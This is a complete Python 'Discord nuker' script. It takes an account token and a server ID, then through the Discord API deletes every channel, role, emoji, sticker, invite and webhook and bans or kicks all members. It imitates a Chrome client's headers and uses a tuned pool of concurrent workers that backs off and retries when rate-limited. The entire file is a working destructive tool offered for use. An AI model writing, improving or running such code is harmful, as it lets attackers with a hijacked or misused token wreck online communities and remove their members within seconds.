import asyncio
import httpx
import logging
import random
import time
import signal
import os
import sys
from collections import deque

RESET = "\033[0m"
BOLD = "\033[1m"
GRAY = "\033[90m"
WHITE = "\033[37m"
BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_MAGENTA = "\033[95m"
BRIGHT_CYAN = "\033[96m"
ORANGE = "\033[38;5;208m"
PURPLE = "\033[38;5;135m"
PINK = "\033[38;5;213m"
TEAL = "\033[38;5;51m"
LIME = "\033[38;5;154m"

BASE = "https://discord.com/api/v10"
MAX_RETRIES = 5
INITIAL_WORKERS = 50
MIN_WORKERS = 25
MAX_WORKERS = 50
JITTER_MIN = 0.001
JITTER_MAX = 0.005
BACKOFF_BASE = 0.05
BACKOFF_MAX = 1.5

stats = {
    "done": 0,
    "already": 0,
    "failed": 0,
    "retries": 0,
    "rate_limits": 0,
    "start_time": 0.0,
}

stats_lock = None
stop_event = None


def _safe_print(text, end="\n"):
    try:
        print(text, end=end, flush=True)
    except UnicodeEncodeError:
        try:
            print(
                text.encode("ascii", "ignore").decode("ascii"),
                end=end,
                flush=True,
            )
        except Exception:
            pass
    except Exception:
        pass


def _box(title, message, color=None):
    if color is None:
        color = BRIGHT_CYAN
    _safe_print("")
    _safe_print(
        f"{PURPLE}┌─ {color}{BOLD}{title}{RESET} "
        f"{PURPLE}───────────────────────────────────────────────────┐{RESET}"
    )
    _safe_print(f"{PURPLE}│{RESET} {color}{message}{RESET}")
    _safe_print(
        f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
    )
    _safe_print("")


def _error_box(message):
    _box("Error", message, BRIGHT_RED)


def _info_box(message):
    _box("Info", message, BRIGHT_CYAN)


def _warning_box(message):
    _box("Warning", message, BRIGHT_YELLOW)


def _safe_clear():
    try:
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
    except Exception:
        pass


def _safe_sleep(seconds):
    if seconds < 0:
        seconds = 0
    if seconds > 60:
        seconds = 60
    return asyncio.sleep(seconds)


def _safe_random_uniform(a, b):
    try:
        if a > b:
            a, b = b, a
        return random.uniform(a, b)
    except Exception:
        return 0.001


def _safe_int(value, default=0):
    try:
        return int(value)
    except (ValueError, TypeError):
        return default


def _safe_float(value, default=0.0):
    try:
        return float(value)
    except (ValueError, TypeError):
        return default


def _safe_json(response):
    try:
        return response.json()
    except Exception:
        return None


def _safe_get(d, key, default=None):
    if not isinstance(d, dict):
        return default
    return d.get(key, default)


def _safe_div(a, b, default=0.0):
    if b == 0:
        return default
    return a / b


def _safe_max(a, b):
    if a > b:
        return a
    return b


def _safe_min(a, b):
    if a < b:
        return a
    return b


def _safe_input(prompt):
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt, UnicodeDecodeError):
        return ""


def _safe_getpass(prompt):
    try:
        import pwinput
        return pwinput.pwinput(prompt=prompt, mask="*").strip()
    except (EOFError, KeyboardInterrupt, UnicodeDecodeError):
        return ""
    except Exception:
        return ""


class _BoxLogHandler(logging.Handler):
    COLORS = {
        "DEBUG": GRAY,
        "INFO": BRIGHT_CYAN,
        "WARNING": BRIGHT_YELLOW,
        "ERROR": BRIGHT_RED,
        "CRITICAL": BRIGHT_RED,
    }

    TITLES = {
        "DEBUG": "Debug",
        "INFO": "Info",
        "WARNING": "Warning",
        "ERROR": "Error",
        "CRITICAL": "Critical",
    }

    def emit(self, record):
        try:
            level = record.levelname
            color = self.COLORS.get(level, GRAY)
            title = self.TITLES.get(level, level)
            msg = record.getMessage()
            if record.exc_info:
                try:
                    msg = f"{msg}\n{self.formatException(record.exc_info)}"
                except Exception:
                    pass
            _safe_print("")
            _safe_print(
                f"{PURPLE}┌─ {color}{BOLD}{title}{RESET} "
                f"{PURPLE}───────────────────────────────────────────────────┐{RESET}"
            )
            for line in str(msg).split("\n"):
                _safe_print(f"{PURPLE}│{RESET} {color}{line}{RESET}")
            _safe_print(
                f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
            )
            _safe_print("")
        except Exception:
            pass


_handler = _BoxLogHandler()
log = logging.getLogger("nuker")
log.setLevel(logging.INFO)
log.handlers = [_handler]
log.propagate = False


def _backoff(attempt):
    exp = min(BACKOFF_BASE * (2 ** attempt), BACKOFF_MAX)
    return exp + _safe_random_uniform(JITTER_MIN, JITTER_MAX)


def _is_mutating(method):
    return method.upper() in ("DELETE", "PUT", "POST", "PATCH")


def _check_h2():
    try:
        import h2  # noqa: F401
        return True
    except ImportError:
        _error_box("Missing Dependency H2\nInstall It With: pip install httpx[http2]")
        return False
    except Exception as e:
        _error_box(f"H2 Import Error: {type(e).__name__}")
        return False


def _check_pwinput():
    try:
        import pwinput  # noqa: F401
        return True
    except ImportError:
        _error_box("Missing Dependency Pwinput\nInstall It With: pip install pwinput")
        return False
    except Exception as e:
        _error_box(f"Pwinput Import Error: {type(e).__name__}")
        return False


class Nuker:
    def __init__(self, token, guild_id):
        self.token = token
        self.guild_id = guild_id
        self.headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/134.0.0.0 Safari/537.36"
            ),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Super-Properties": (
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xv"
                "Y2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3"
                "MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgTGlrZSBH"
                "ZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjo"
                "iMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIi"
                "wiY2xpZW50X2J1aWxkX251bWJlciI6MzAwMDAwfQ=="
            ),
        }
        self.client = None
        self.queue = None
        self.cache = {"channels": None, "roles": None}
        self.user = None
        self.guild = None
        self.permissions = 0
        self.is_owner = False
        self.is_admin = False

    async def __aenter__(self):
        self.queue = asyncio.Queue()
        limits = httpx.Limits(
            max_connections=200,
            max_keepalive_connections=100,
            keepalive_expiry=60.0,
        )
        timeout = httpx.Timeout(connect=3.0, read=10.0, write=10.0, pool=3.0)
        self.client = httpx.AsyncClient(
            timeout=timeout,
            limits=limits,
            headers=self.headers,
            http2=True,
            follow_redirects=True,
        )
        return self

    async def __aexit__(self, *args):
        try:
            if self.client:
                await self.client.aclose()
        except Exception:
            pass

    async def validate_token(self):
        try:
            r = await self.client.get(f"{BASE}/users/@me")
            if r.status_code == 200:
                data = _safe_json(r)
                if isinstance(data, dict):
                    self.user = data
                    return True
            return False
        except Exception:
            return False

    async def validate_guild(self):
        try:
            r = await self.client.get(f"{BASE}/guilds/{self.guild_id}")
            if r.status_code == 200:
                data = _safe_json(r)
                if isinstance(data, dict):
                    self.guild = data
                    return True
            return False
        except Exception:
            return False

    async def validate_permissions(self):
        try:
            if not self.guild or not self.user:
                return False

            my_id = _safe_get(self.user, "id")
            if not my_id:
                return False

            if _safe_get(self.guild, "owner_id") == my_id:
                self.is_owner = True
                self.is_admin = True
                self.permissions = 0xFFFFFFFFFFFFFFFF
                return True

            try:
                r = await self.client.get(f"{BASE}/guilds/{self.guild_id}/roles")
            except Exception:
                return False

            if r.status_code != 200:
                return False

            all_roles = _safe_json(r)
            if not isinstance(all_roles, list):
                return False

            try:
                r2 = await self.client.get(
                    f"{BASE}/guilds/{self.guild_id}/members/{my_id}"
                )
            except Exception:
                return False

            if r2.status_code != 200:
                self.permissions = 0
                self.is_admin = False
                return True

            member = _safe_json(r2)
            if not isinstance(member, dict):
                self.permissions = 0
                self.is_admin = False
                return True

            my_roles = set(_safe_get(member, "roles", []))
            perms = 0

            for role in all_roles:
                if not isinstance(role, dict):
                    continue
                rid = _safe_get(role, "id")
                if not rid:
                    continue
                rperm = _safe_int(_safe_get(role, "permissions", 0), 0)
                if rid == self.guild_id:
                    perms |= rperm
                elif rid in my_roles:
                    perms |= rperm

            self.permissions = perms
            self.is_admin = bool(perms & 0x8)
            return True
        except Exception:
            return False

    async def validate_all(self):
        _safe_print("")
        _safe_print(
            f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}Validation{RESET} "
            f"{PURPLE}───────────────────────────────────────────────┐{RESET}"
        )

        if not self.token:
            _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Token: Required{RESET}")
            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return False

        if not await self.validate_token():
            _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Token: Invalid{RESET}")
            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return False

        if not self.user:
            _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Token: Invalid{RESET}")
            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return False

        _safe_print(
            f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Token: {TEAL}{BOLD}"
            f"{_safe_get(self.user, 'username', 'Unknown')}"
            f"#{_safe_get(self.user, 'discriminator', '0')}{RESET}"
        )

        if not self.guild_id:
            _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Guild: Required{RESET}")
            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return False

        if not await self.validate_guild():
            _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Guild: Not Found{RESET}")
            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return False

        if not self.guild:
            _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Guild: Not Found{RESET}")
            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return False

        _safe_print(
            f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Guild: {TEAL}{BOLD}"
            f"{_safe_get(self.guild, 'name', 'Unknown')}{RESET}"
        )

        if not await self.validate_permissions():
            _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Permissions: Could Not Fetch{RESET}")
            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return False

        if self.is_owner:
            _safe_print(
                f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Permissions: "
                f"{TEAL}{BOLD}Owner{RESET}"
            )
        elif self.is_admin:
            _safe_print(
                f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Permissions: "
                f"{TEAL}{BOLD}Administrator{RESET}"
            )
        else:
            _safe_print(
                f"{PURPLE}│{RESET} {BRIGHT_YELLOW}⚠ Permissions: "
                f"{TEAL}{BOLD}Limited (0x{self.permissions:X}){RESET}"
            )

        _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
        return True

    async def request(self, method, url, json=None, attempt=0):
        try:
            if stop_event.is_set():
                return None

            is_mutating = _is_mutating(method)

            if attempt >= MAX_RETRIES:
                if is_mutating:
                    async with stats_lock:
                        stats["failed"] += 1
                return None

            try:
                r = await self.client.request(method, url, json=json)
            except httpx.ConnectTimeout:
                async with stats_lock:
                    stats["failed"] += 1
                return None
            except (
                httpx.RequestError,
                httpx.TimeoutException,
                httpx.RemoteProtocolError,
                asyncio.TimeoutError,
            ):
                async with stats_lock:
                    stats["retries"] += 1
                await _safe_sleep(_backoff(attempt))
                return await self.request(method, url, json, attempt + 1)
            except Exception:
                return None

            status = r.status_code

            if status in (200, 201, 204):
                if is_mutating:
                    async with stats_lock:
                        stats["done"] += 1
                return r

            if status == 404:
                if is_mutating:
                    async with stats_lock:
                        stats["already"] += 1
                return r

            if status == 429:
                body = _safe_json(r) or {}
                if not isinstance(body, dict):
                    body = {}
                retry_after = _safe_float(body.get("retry_after", 1.0), 1.0)
                scope = r.headers.get("X-RateLimit-Scope", "")
                try:
                    if r.headers.get("Retry-After"):
                        retry_after = max(
                            retry_after,
                            _safe_float(r.headers["Retry-After"], retry_after),
                        )
                except Exception:
                    pass
                is_global = bool(body.get("global", False)) or scope == "global"
                async with stats_lock:
                    stats["rate_limits"] += 1
                    stats["retries"] += 1
                sleep_time = retry_after + _safe_random_uniform(
                    JITTER_MIN, JITTER_MAX
                )
                if is_global:
                    _warning_box(
                        f"Global Rate Limit — Sleeping {sleep_time:.2f}s"
                    )
                await _safe_sleep(sleep_time)
                return await self.request(method, url, json, attempt + 1)

            if status in (401, 403):
                if is_mutating:
                    async with stats_lock:
                        stats["failed"] += 1
                return r

            if status in (500, 502, 503, 504):
                async with stats_lock:
                    stats["retries"] += 1
                await _safe_sleep(_backoff(attempt))
                return await self.request(method, url, json, attempt + 1)

            if is_mutating:
                async with stats_lock:
                    stats["failed"] += 1
            return r
        except Exception:
            return None

    async def get_channels(self):
        if self.cache["channels"] is not None:
            return self.cache["channels"]
        r = await self.request("GET", f"{BASE}/guilds/{self.guild_id}/channels")
        if r.status_code == 200:
            data = _safe_json(r)
            if isinstance(data, list):
                self.cache["channels"] = data
                return self.cache["channels"]
        return []

    async def get_roles(self):
        if self.cache["roles"] is not None:
            return self.cache["roles"]
        r = await self.request("GET", f"{BASE}/guilds/{self.guild_id}/roles")
        if r.status_code == 200:
            data = _safe_json(r)
            if isinstance(data, list):
                self.cache["roles"] = data
                return self.cache["roles"]
        return []

    async def iter_members(self):
        after = "0"
        consecutive_errors = 0
        MAX_CONSECUTIVE_ERRORS = 3

        while True:
            if stop_event.is_set():
                return

            r = await self.request(
                "GET",
                f"{BASE}/guilds/{self.guild_id}/members"
                f"?limit=1000&after={after}",
            )

            if not r:
                return

            if r.status_code == 403:
                return

            if r.status_code == 429:
                return

            if r.status_code not in (200, 204):
                consecutive_errors += 1
                if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                    return
                await _safe_sleep(_backoff(consecutive_errors))
                continue

            consecutive_errors = 0

            batch = _safe_json(r)
            if not isinstance(batch, list):
                return

            if not batch:
                return

            for m in batch:
                yield m

            try:
                last_user_id = batch[-1]["user"]["id"]
            except (KeyError, TypeError, IndexError):
                return

            after = last_user_id
            if len(batch) < 1000:
                return


class WorkerPool:
    def __init__(self, nuker):
        self.nuker = nuker
        self.current_workers = INITIAL_WORKERS
        self.tasks = deque()
        self.pool_lock = asyncio.Lock()

    async def _worker(self, stagger=0.0):
        claimed = False
        try:
            if stagger > 0:
                try:
                    await _safe_sleep(stagger)
                except asyncio.CancelledError:
                    return

            while True:
                if stop_event.is_set():
                    return

                claimed = False
                try:
                    method, url, payload = self.nuker.queue.get_nowait()
                    claimed = True
                except asyncio.QueueEmpty:
                    return

                try:
                    await self.nuker.request(method, url, payload)
                except asyncio.CancelledError:
                    if claimed:
                        try:
                            self.nuker.queue.task_done()
                        except Exception:
                            pass
                        claimed = False
                    raise
                except Exception:
                    pass
                finally:
                    if claimed:
                        try:
                            self.nuker.queue.task_done()
                        except Exception:
                            pass
                        claimed = False
        except asyncio.CancelledError:
            raise
        except Exception:
            return

    async def start(self):
        for _ in range(self.current_workers):
            stagger = _safe_random_uniform(0.0, 0.05)
            loop = asyncio.get_running_loop()
            self.tasks.append(loop.create_task(self._worker(stagger=stagger)))

    async def autotune(self):
        last_done = 0
        last_rl = 0
        while True:
            if stop_event.is_set():
                return

            try:
                await _safe_sleep(1)
            except asyncio.CancelledError:
                return

            async with stats_lock:
                done = stats["done"] - last_done
                rl = stats["rate_limits"] - last_rl
                last_done = stats["done"]
                last_rl = stats["rate_limits"]

            async with self.pool_lock:
                live_tasks = deque(t for t in list(self.tasks) if not t.done())
                self.tasks = live_tasks

                if rl > done * 0.3 and self.current_workers > MIN_WORKERS:
                    new_count = _safe_max(
                        MIN_WORKERS, int(self.current_workers * 0.8)
                    )
                    if new_count < self.current_workers:
                        excess = len(self.tasks) - new_count
                        for _ in range(_safe_max(0, excess)):
                            try:
                                t = self.tasks.pop()
                                t.cancel()
                            except Exception:
                                pass
                        old = self.current_workers
                        self.current_workers = new_count
                        _info_box(f"Auto Tune Down — {old} → {new_count}")

                elif (
                    rl == 0
                    and done > 20
                    and self.current_workers < MAX_WORKERS
                ):
                    new_count = _safe_min(
                        MAX_WORKERS, self.current_workers + 5
                    )
                    to_spawn = new_count - len(self.tasks)
                    for _ in range(_safe_max(0, to_spawn)):
                        loop = asyncio.get_running_loop()
                        self.tasks.append(
                            loop.create_task(
                                self._worker(
                                    stagger=_safe_random_uniform(0.0, 0.05)
                                )
                            )
                        )
                    old = self.current_workers
                    self.current_workers = new_count
                    _info_box(f"Auto Tune Up — {old} → {new_count}")

    async def stop(self):
        async with self.pool_lock:
            tasks_snapshot = list(self.tasks)
            self.tasks.clear()

        for t in tasks_snapshot:
            try:
                t.cancel()
            except Exception:
                pass

        if tasks_snapshot:
            await asyncio.gather(*tasks_snapshot, return_exceptions=True)


def _fmt_bar(done, total, width=30):
    if width < 0:
        width = 0
    if width > 200:
        width = 200
    if total <= 0:
        return f"{PURPLE}[{' ' * width}]{RESET}"
    done = _safe_max(0, _safe_min(done, total))
    filled = _safe_max(0, _safe_min(width, int(width * done / total)))
    pct = _safe_div(done, total, 0)
    color = (
        BRIGHT_RED
        if pct < 0.33
        else ORANGE
        if pct < 0.66
        else BRIGHT_GREEN
    )
    bar = f"{color}{'█' * filled}{PURPLE}{'░' * (width - filled)}{RESET}"
    return f"{PURPLE}[{RESET}{bar}{PURPLE}]{RESET}"


async def progress_reporter(total):
    last_done = 0
    last_time = time.time()
    while True:
        if stop_event.is_set():
            return

        try:
            await _safe_sleep(0.25)
        except asyncio.CancelledError:
            return

        now = time.time()
        async with stats_lock:
            done = stats["done"]
            already = stats["already"]
            failed = stats["failed"]
            retries = stats["retries"]
            rl = stats["rate_limits"]

        total_processed = done + already
        delta = _safe_max(0, total_processed - last_done)
        dt = _safe_max(0, now - last_time)
        rate = _safe_div(delta, dt, 0)
        last_done = total_processed
        last_time = now

        settled = total_processed + failed
        bar = _fmt_bar(settled, total)
        pct = _safe_max(
            0.0,
            _safe_min(
                100.0,
                _safe_div(settled, total, 0) * 100 if total else 0,
            ),
        )
        remaining = _safe_max(0, total - settled)
        eta = _safe_div(remaining, rate, 0)

        line = (
            f"{bar} {BOLD}{TEAL}{pct:5.1f}%{RESET} "
            f"{PURPLE}│{RESET} {BRIGHT_GREEN}OK {done}{RESET} "
            f"{PURPLE}│{RESET} {GRAY}SKIP {already}{RESET} "
            f"{PURPLE}│{RESET} {BRIGHT_RED}FAIL {failed}{RESET} "
            f"{PURPLE}│{RESET} {BRIGHT_YELLOW}RL {rl}{RESET} "
            f"{PURPLE}│{RESET} {LIME}RETRY {retries}{RESET} "
            f"{PURPLE}│{RESET} {PINK}{rate:5.1f}/s{RESET} "
            f"{PURPLE}│{RESET} {BRIGHT_BLUE}ETA {eta:5.0f}s{RESET}"
        )
        try:
            print(f"\r{line}", end="", flush=True)
        except UnicodeEncodeError:
            pass


async def delete_channels(nuker):
    channels = await nuker.get_channels()
    if not channels:
        _error_box("No Channels Found")
        return 0
    categories = [c for c in channels if _safe_get(c, "type") == 4]
    others = [c for c in channels if _safe_get(c, "type") != 4]
    count = 0
    for c in others + categories:
        cid = _safe_get(c, "id")
        if not cid:
            continue
        nuker.queue.put_nowait(("DELETE", f"{BASE}/channels/{cid}", None))
        count += 1
    if count == 0:
        _error_box("No Channels Found")
    return count


async def delete_roles(nuker):
    roles = await nuker.get_roles()
    if not roles:
        _error_box("No Roles Found")
        return 0
    count = 0
    for role in roles:
        if _safe_get(role, "managed") or _safe_get(role, "id") == nuker.guild_id:
            continue
        rid = _safe_get(role, "id")
        if not rid:
            continue
        nuker.queue.put_nowait(
            ("DELETE", f"{BASE}/guilds/{nuker.guild_id}/roles/{rid}", None)
        )
        count += 1
    if count == 0:
        _error_box("No Roles Found")
    return count


async def ban_members(nuker):
    my_id = _safe_get(nuker.user, "id")
    count = 0
    async for m in nuker.iter_members():
        uid = _safe_get(_safe_get(m, "user", {}), "id")
        if not uid:
            continue
        if uid == my_id:
            continue
        nuker.queue.put_nowait(
            (
                "PUT",
                f"{BASE}/guilds/{nuker.guild_id}/bans/{uid}",
                {"delete_message_seconds": 0},
            )
        )
        count += 1
    if count == 0:
        _error_box("No Members Found")
    return count


async def kick_members(nuker):
    my_id = _safe_get(nuker.user, "id")
    count = 0
    async for m in nuker.iter_members():
        uid = _safe_get(_safe_get(m, "user", {}), "id")
        if not uid:
            continue
        if uid == my_id:
            continue
        nuker.queue.put_nowait(
            ("DELETE", f"{BASE}/guilds/{nuker.guild_id}/members/{uid}", None)
        )
        count += 1
    if count == 0:
        _error_box("No Members Found")
    return count


async def delete_emojis(nuker):
    r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/emojis")
    if not r or r.status_code != 200:
        return 0
    emojis = _safe_json(r)
    if not isinstance(emojis, list) or not emojis:
        _error_box("No Emojis Found")
        return 0
    count = 0
    for e in emojis:
        eid = _safe_get(e, "id")
        if not eid:
            continue
        nuker.queue.put_nowait(
            ("DELETE", f"{BASE}/guilds/{nuker.guild_id}/emojis/{eid}", None)
        )
        count += 1
    return count


async def delete_stickers(nuker):
    r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/stickers")
    if not r or r.status_code != 200:
        return 0
    stickers = _safe_json(r)
    if not isinstance(stickers, list) or not stickers:
        _error_box("No Stickers Found")
        return 0
    count = 0
    for s in stickers:
        sid = _safe_get(s, "id")
        if not sid:
            continue
        nuker.queue.put_nowait(
            ("DELETE", f"{BASE}/guilds/{nuker.guild_id}/stickers/{sid}", None)
        )
        count += 1
    return count


async def delete_invites(nuker):
    r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/invites")
    if not r or r.status_code != 200:
        return 0
    invites = _safe_json(r)
    if not isinstance(invites, list) or not invites:
        _error_box("No Invites Found")
        return 0
    count = 0
    for inv in invites:
        code = _safe_get(inv, "code")
        if not code:
            continue
        nuker.queue.put_nowait(("DELETE", f"{BASE}/invites/{code}", None))
        count += 1
    return count


async def delete_webhooks(nuker):
    r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/webhooks")
    if not r or r.status_code != 200:
        return 0
    webhooks = _safe_json(r)
    if not isinstance(webhooks, list) or not webhooks:
        _error_box("No Webhooks Found")
        return 0
    count = 0
    for w in webhooks:
        wid = _safe_get(w, "id")
        if not wid:
            continue
        nuker.queue.put_nowait(("DELETE", f"{BASE}/webhooks/{wid}", None))
        count += 1
    return count


ACTIONS = {
    "1": ("Delete Channels & Categories", delete_channels),
    "2": ("Delete Roles", delete_roles),
    "3": ("Ban All Members", ban_members),
    "4": ("Kick All Members", kick_members),
    "5": ("Delete Emojis", delete_emojis),
    "6": ("Delete Stickers", delete_stickers),
    "7": ("Delete Invites", delete_invites),
    "8": ("Delete Webhooks", delete_webhooks),
    "9": ("Run Everything", None),
}


async def run_action(nuker, choice):
    if choice == "9":
        total = 0
        for key in ["1", "2", "5", "6", "7", "8", "3"]:
            _, fn = ACTIONS[key]
            total += await fn(nuker)
        return total

    _, fn = ACTIONS[choice]
    if fn is None:
        return 0
    return await fn(nuker)


def _print_actions():
    _safe_print("")
    _safe_print(
        f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}Mini Flay Discord Nuker{RESET} "
        f"{PURPLE}──────────────────────────────────────┐{RESET}"
    )
    _safe_print(f"{PURPLE}│{RESET} {TEAL}Available Actions{RESET}")
    _safe_print(
        f"{PURPLE}├──────────────────────────────────────────────────────────┤{RESET}"
    )
    for key in sorted(ACTIONS.keys(), key=lambda k: int(k)):
        name, _ = ACTIONS[key]
        if key == "9":
            _safe_print(
                f"{PURPLE}│{RESET} {BRIGHT_RED}{BOLD}[{key}] {name}{RESET}"
            )
        else:
            _safe_print(
                f"{PURPLE}│{RESET} {LIME}[{key}]{RESET} {WHITE}{name}{RESET}"
            )
    _safe_print(
        f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
    )
    _safe_print("")


async def main():
    global stats_lock, stop_event

    if not _check_h2():
        return

    if not _check_pwinput():
        return

    stats_lock = asyncio.Lock()
    stop_event = asyncio.Event()

    stats.update(
        {
            "done": 0,
            "already": 0,
            "failed": 0,
            "retries": 0,
            "rate_limits": 0,
            "start_time": 0.0,
        }
    )

    _safe_clear()

    _safe_print("")
    _safe_print(
        f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}Configuration{RESET} "
        f"{PURPLE}────────────────────────────────────────────┐{RESET}"
    )
    token = _safe_getpass(
        f"{PURPLE}│{RESET} {TEAL}Token{RESET}  {PURPLE}➜{RESET} "
    )
    guild_id = _safe_input(
        f"{PURPLE}│{RESET} {TEAL}Guild{RESET}  {PURPLE}➜{RESET} "
    )
    _safe_print(
        f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
    )

    nuker = Nuker(token, guild_id)
    async with nuker:
        if not await nuker.validate_all():
            return

        _print_actions()
        choice = _safe_input(
            f"  {PURPLE}➜{RESET} {BOLD}Choose An Option:{RESET} "
        )

        if choice not in ACTIONS:
            _error_box("Invalid Option")
            return

        stats["start_time"] = time.time()

        total = await run_action(nuker, choice)

        if total == 0:
            return

        _safe_print("")
        _safe_print(
            f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}Queue{RESET} "
            f"{PURPLE}─────────────────────────────────────────────────┐{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} Total Operations Queued: {LIME}{BOLD}{total}{RESET}"
        )
        _safe_print(
            f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
        )

        pool = WorkerPool(nuker)
        await pool.start()

        reporter = asyncio.create_task(progress_reporter(total))
        autotune_task = asyncio.create_task(pool.autotune())

        try:
            await nuker.queue.join()
        finally:
            stop_event.set()
            if autotune_task:
                autotune_task.cancel()
            if reporter:
                reporter.cancel()
            await pool.stop()
            gather_list = [t for t in [autotune_task, reporter] if t]
            if gather_list:
                await asyncio.gather(*gather_list, return_exceptions=True)
            _safe_print("")

        _safe_print("")
        elapsed = time.time() - stats["start_time"]
        done = stats["done"]
        already = stats["already"]
        failed = stats["failed"]
        retries = stats["retries"]
        rl = stats["rate_limits"]

        _safe_print(
            f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}Final Results{RESET} "
            f"{PURPLE}────────────────────────────────────────┐{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔  Success   {RESET}: {BOLD}{done}/{total}{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} {GRAY}↷  Skipped   {RESET}: {BOLD}{already}{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} {BRIGHT_RED}✘  Failed    {RESET}: {BOLD}{failed}{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} {BRIGHT_YELLOW}↻  Retries   {RESET}: {BOLD}{retries}{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} {LIME}⏱  Rate Lmt  {RESET}: {BOLD}{rl}{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} {LIME}⏲  Time      {RESET}: {BOLD}{elapsed:.2f}s{RESET}"
        )
        _safe_print(
            f"{PURPLE}│{RESET} {PINK}⚡  Avg Rate  {RESET}: "
            f"{BOLD}{_safe_div(done, max(elapsed, 0.01), 0):.1f}/s{RESET}"
        )
        _safe_print(
            f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
        )


def _signal_handler(sig, frame):
    _warning_box("Interrupted — Shutting Down...")
    os._exit(1)


def _run_main():
    try:
        asyncio.get_running_loop()
        return 1
    except RuntimeError:
        pass
    try:
        asyncio.run(main())
        return 0
    except KeyboardInterrupt:
        return 130
    except RuntimeError:
        return 1
    except Exception:
        return 1


if __name__ == "__main__":
    try:
        signal.signal(signal.SIGINT, _signal_handler)
    except Exception:
        pass
    try:
        sys.exit(_run_main())
    except SystemExit:
        raise
    except Exception:
        pass